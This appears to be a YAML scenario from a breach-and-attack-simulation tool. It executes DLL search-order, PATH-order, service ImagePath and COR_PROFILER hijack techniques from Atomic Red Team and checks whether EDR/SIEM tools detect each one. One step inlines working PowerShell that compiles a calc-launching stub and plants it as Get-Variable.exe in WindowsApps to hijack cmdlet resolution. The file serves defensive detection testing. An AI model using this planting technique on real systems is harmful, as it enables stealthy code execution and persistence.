id: dll-hijack-execution
name: DLL Hijack Execution  -  Search-Order, Phantom-DLL, PATH-Order, COR_PROFILER
description: >
  Executes real Hijack Execution Flow (T1574) techniques -- DLL search-order
  hijacking, PATH-order interception, service registry ImagePath tampering,
  and COR_PROFILER injection -- and checks whether EDR/SIEM detects each one.

  This is EXECUTION validation, not exposure scanning: it does not check
  whether the endpoint is theoretically vulnerable (see
  scenarios/exposure-validation.yaml for that), it actually performs each
  hijack technique against artifacts this scenario creates itself, then
  cleans up. One step (Step 4) is a pure read-only CONDITION CHECK
  (registry ACL enumeration) rather than an execution -- it is labeled as
  such in its step name and should not be scored as equivalent to the
  execution steps.

  Sourced from real Atomic Red Team atomics, verified against upstream
  content on 2026-08-24. T1574.002 (DLL Side-Loading) has NO real ART
  atomics upstream and is not represented here. Excluded from this
  scenario: atomics requiring a reboot to take effect (phantom-DLL via
  Print Spooler restart, system-scope COR_PROFILER), atomics that fetch a
  binary from the public internet at execution time (GUP.exe sideload,
  dotnet startup-hook sideload -- air-gap-incompatible), and one atomic
  that installs real third-party commercial software with a required
  manual popup dismissal (KeyScrambler) -- none of these are safe or
  deterministic enough for an unattended production run.

  Expected verdicts:
    PASS  = EDR/SIEM detected the hijack execution (or, for Step 4, the
            ACL enumeration)
    FAIL  = the technique executed without generating an alert
    SKIP  = a required curated payload (ntprint.dll or T1574.012x64.dll,
            see packaging/art-payloads/) is missing from this deployment
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - hijack-execution-flow
  - dll-hijack
  - windows
  - art
  - atomic-red-team
  - t1574
  - t1574.001
  - t1574.008
  - t1574.011
  - t1574.012
  - mitre-attack
mitre_phases:
  - persistence
  - privilege-escalation
  - defense-evasion

steps:
  # ── T1574.001 — DLL Search Order Hijacking: amsi.dll (real ART atomic) ────
  - name: "T1574.001 - Execution: DLL Search Order Hijacking via amsi.dll"
    technique_id: T1574.001
    framework: art
    test_index: 0
    executor: powershell
    requires_priv: user
    timeout_sec: 30

  # ── T1574.001 — DLL Search Order Hijacking: ntprint LOLBin (real ART atomic,
  #    needs packaging/art-payloads/ntprint.dll, curated 2026-08-24) ────────
  - name: "T1574.001 - Execution: DLL Search Order Hijacking via ntprint.exe LOLBin"
    technique_id: T1574.001
    framework: art
    test_index: 6
    executor: powershell
    requires_priv: admin
    timeout_sec: 30

  # ── T1574.008 — Path Interception by Search Order Hijacking (hand-ported:
  #    same technique as the real ART atomic, C# source inlined below instead
  #    of depending on packaging/art-payloads/ -- calc.cs is plain source, not
  #    an executable, so it is outside the payload importer's extension
  #    allowlist; inlining avoids that gap entirely) ─────────────────────────
  - name: "T1574.008 - Execution: PATH-Order Hijack of PowerShell Module Resolution"
    technique_id: T1574.008
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    reversible: true
    blast_radius: "Compiles a benign stub (calc.exe launcher) named Get-Variable.exe into %LOCALAPPDATA%\\Microsoft\\WindowsApps -- a directory Windows resolves ahead of built-in cmdlets on PATH for some invocation forms (the real-world Colibri loader persistence trick). Launching a plain PowerShell session then executes the planted binary instead of the real Get-Variable cmdlet. Self-cleaning: the compiled exe is deleted and the spawned calculator process killed."
    telemetry:
      - "Sysmon EID 1: csc.exe compiling to %LOCALAPPDATA%\\Microsoft\\WindowsApps\\Get-Variable.exe"
      - "Sysmon EID 1: Get-Variable.exe spawned from WindowsApps, itself spawning cmd.exe -> calculator.exe"
    detection:
      - "EDR: an executable named after a PowerShell cmdlet, running from WindowsApps -- Sigma proc_creation_win_susp_powershell_module_hijack style rule"
      - "SIEM: csc.exe (a build tool) invoked outside a dev/build host context -- classic LOLBin compile-on-target signal"
    command: |
      $ErrorActionPreference = 'Stop'
      $srcLines = @(
        'using System.Diagnostics;'
        ''
        'namespace Console'
        '{'
        '    class Program'
        '    {'
        '        static void Main(string[] args)'
        '        {'
        '            var proc = new ProcessStartInfo();'
        '            proc.UseShellExecute = true;'
        '            proc.WorkingDirectory = @"C:\Windows\System32";'
        '            proc.FileName = @"cmd.exe";'
        '            proc.Arguments = "/c calc.exe";'
        '            proc.WindowStyle = ProcessWindowStyle.Hidden;'
        '            Process.Start(proc);'
        '        }'
        '    }'
        '}'
      )
      $src = $srcLines -join "`r`n"
      $csPath = Join-Path $env:TEMP "bas-sim-dllhijack-calc.cs"
      $outDir = Join-Path $env:LOCALAPPDATA "Microsoft\WindowsApps"
      $outExe = Join-Path $outDir "Get-Variable.exe"
      Set-Content -Path $csPath -Value $src -Encoding ASCII
      $csc = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
      $compiled = $false
      if (Test-Path $csc) {
        & $csc "/out:$outExe" $csPath 2>&1 | Out-Null
        $compiled = Test-Path $outExe
      }
      if ($compiled) {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile","-Command","exit" -Wait
        Write-Output "EXEC T1574.008: Get-Variable.exe planted in WindowsApps and PowerShell invoked. [BAS-SIM-DLH-S3]"
        Write-Output "FAIL: PATH-order hijack binary compiled and planted without interference -- ensure EDR flags executables named after built-in cmdlets launching from WindowsApps."
      } else {
        Write-Output "PASS: csc.exe was unavailable or blocked -- PATH-order hijack could not be staged. [BAS-SIM-DLH-S3]"
      }
    cleanup: |
      $outExe = Join-Path $env:LOCALAPPDATA "Microsoft\WindowsApps\Get-Variable.exe"
      Remove-Item -Path $outExe -Force -ErrorAction SilentlyContinue
      Remove-Item -Path (Join-Path $env:TEMP "bas-sim-dllhijack-calc.cs") -Force -ErrorAction SilentlyContinue
      Stop-Process -Name "calculator" -Force -ErrorAction SilentlyContinue
      Stop-Process -Name "CalculatorApp" -Force -ErrorAction SilentlyContinue

  # ── T1574.011 — Services Registry Permissions Weakness: ACL check (real ART
  #    atomic, test 1). CONDITION CHECK, not an execution -- pure read-only
  #    enumeration, no state change, no cleanup needed. ──────────────────────
  - name: "T1574.011 - Condition Check: Service Registry ACL Enumeration (read-only, not an execution)"
    technique_id: T1574.011
    framework: art
    test_index: 0
    executor: powershell
    requires_priv: user
    timeout_sec: 15

  # ── T1574.011 — Services Registry Permissions Weakness: ImagePath hijack
  #    (real ART atomic, test 2; creates its own disposable service, no
  #    dependency on a real pre-existing weak service) ───────────────────────
  - name: "T1574.011 - Execution: Service ImagePath Hijack via reg.exe"
    technique_id: T1574.011
    framework: art
    test_index: 1
    executor: powershell
    requires_priv: admin
    timeout_sec: 30

  # ── T1574.012 — COR_PROFILER, registry-free process scope (real ART atomic,
  #    test 3 -- the only one of the three that needs neither a reboot nor
  #    persistent registry state; needs packaging/art-payloads/T1574.012x64.dll,
  #    curated 2026-08-24) ────────────────────────────────────────────────────
  - name: "T1574.012 - Execution: Registry-Free Process-Scope COR_PROFILER Hijack"
    technique_id: T1574.012
    framework: art
    test_index: 2
    executor: powershell
    requires_priv: user
    timeout_sec: 30
